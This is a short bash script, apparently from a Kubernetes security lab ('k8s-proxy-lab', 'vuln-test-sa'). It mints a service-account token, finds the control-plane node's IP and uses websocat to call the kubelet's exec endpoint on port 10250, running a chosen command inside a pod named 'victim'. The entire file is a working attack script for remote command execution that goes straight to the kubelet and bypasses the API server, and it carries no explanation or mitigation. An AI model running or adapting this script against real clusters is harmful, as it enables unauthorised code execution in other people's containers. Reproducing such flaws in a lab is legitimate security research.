#!/bin/bash

RAW_INPUT=${1:-id}

QUERY_STRING=""

# We use 'read' to split the input string by spaces into an array
read -ra ADDR <<< "$RAW_INPUT"

for i in "${ADDR[@]}"; do
    # URL encode the segment using jq if available, otherwise python, or simple sed
    if command -v jq &> /dev/null; then
        ENCODED=$(echo -n "$i" | jq -sRr @uri)
    elif command -v python3 &> /dev/null; then
        ENCODED=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$i")
    else
        # Basic fallback (handles slashes and simple chars)
        ENCODED=${i//\//%2F}
    fi
    
    # Append to the query string
    QUERY_STRING="${QUERY_STRING}&command=${ENCODED}"
done

# 3. GENERATE TOKEN
TOKEN=$(kubectl create token vuln-test-sa --duration=1h)

# 4. GET TARGET NODE IP
NODE_IP=$(kubectl get node k8s-proxy-lab-control-plane -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')

echo "Targeting: $NODE_IP"
echo "Executing: $RAW_INPUT"
echo "Constructed Query: $QUERY_STRING"

# 5. EXECUTE
websocat -k \
  -H "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://${NODE_IP}:10250/exec/default/victim/victim?output=1&error=1${QUERY_STRING}"
